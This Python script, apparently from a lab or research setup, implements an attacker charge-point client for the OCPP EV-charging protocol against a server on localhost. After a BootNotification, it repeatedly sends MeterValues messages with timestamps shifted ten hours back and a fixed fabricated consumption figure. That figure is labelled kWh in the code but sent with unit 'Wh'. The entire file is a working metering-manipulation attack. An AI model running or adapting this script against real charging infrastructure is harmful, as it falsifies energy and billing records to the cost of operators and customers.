import asyncio
import logging
import websockets
import json
from datetime import datetime, timezone, timedelta

logging.basicConfig(level=logging.INFO)

# --- SALDIRI PARAMETRELERİ ---
TIME_SHIFT_HOURS = 10
ATTACK_CONSUMPTION_KWH = 50.0 
# DÜZELTME: Yol bilgisi kaldırıldı, sadece port kaldı
SUNUCU_ADRESI = 'ws://localhost:9000' 

def timestamp_olustur(offset_hours=0):
    """Offset'li veya offsetsiz zaman damgası oluşturur."""
    dt = datetime.now(timezone.utc) - timedelta(hours=offset_hours)
    return dt.isoformat(timespec='seconds').replace('+00:00', 'Z')

def call_olustur(action, payload, mesaj_id):
    """OCPP Call (çağrı) mesajı dizisi oluşturur."""
    return json.dumps([2, mesaj_id, action, payload])

async def client_loop():
    print("==================================================")
    print(" SALDIRGAN İSTEMCİ (TEK ARGÜMAN) - Port 9000")
    print("==================================================")

    try:
        # DÜZELTME: Subprotocols da kaldırıldı, saf WebSocket bağlantısı kuruluyor
        async with websockets.connect(SUNUCU_ADRESI) as websocket: 
            print("[CP] ✅ Sunucuya bağlantı başarılı.")
            
            boot_mesaj = call_olustur('BootNotification', 
                                    {"chargePointModel": "Raw-v1", "chargePointVendor": "TimeShift"}, 
                                    "boot-001")
            await websocket.send(boot_mesaj)
            print("[CP] 📤 BootNotification gönderildi.")

            async for message in websocket:
                mesaj = json.loads(message)
                [mesaj_tipi, mesaj_id, payload] = mesaj
                
                if mesaj_tipi == 3 and mesaj_id == "boot-001":
                    print(f"[CP] ✅ BootNotification onayı alındı. Status: {payload.get('status')}")
                    asyncio.create_task(send_meter_values(websocket))
                    
                elif mesaj_tipi == 3:
                    pass

    except websockets.exceptions.ConnectionClosed:
        print("[CP] 🔌 Bağlantı normal şekilde kapatıldı.")
    except Exception as e:
        print(f"[CP] ❌ Hata: Bağlantı veya İşleme Hatası: {e}")

async def send_meter_values(websocket):
    """Manipüle edilmiş MeterValues'ları periyodik olarak gönderir."""
    mesaj_sayaci = 1
    while True:
        await asyncio.sleep(5)
        
        recorded_time_str = timestamp_olustur(TIME_SHIFT_HOURS)
        actual_time = datetime.now(timezone.utc)

        print(f"\n[SALDIRGAN CP] ⏰ Gerçek Zaman: {actual_time.strftime('%H:%M:%S')}")
        print(f"[SALDIRGAN CP] 💾 Kaydırılmış Zaman (Saldırı): {recorded_time_str.split('T')[1]}... ")
        print(f"[SALDIRGAN CP] ⚡ {ATTACK_CONSUMPTION_KWH} kWh raporlanıyor.")

        meter_mesaj = call_olustur('MeterValues', {
            "connectorId": 1,
            "meterValue": [{
                "timestamp": recorded_time_str,
                "sampledValue": [
                    {"value": str(ATTACK_CONSUMPTION_KWH), "context": "Sample.Periodic", "measurand": "Energy.Active.Import.Register", "unit": "Wh"}
                ]
            }]
        }, f"meter-{mesaj_sayaci}")

        await websocket.send(meter_mesaj)
        mesaj_sayaci += 1

if __name__ == '__main__':
    asyncio.run(client_loop())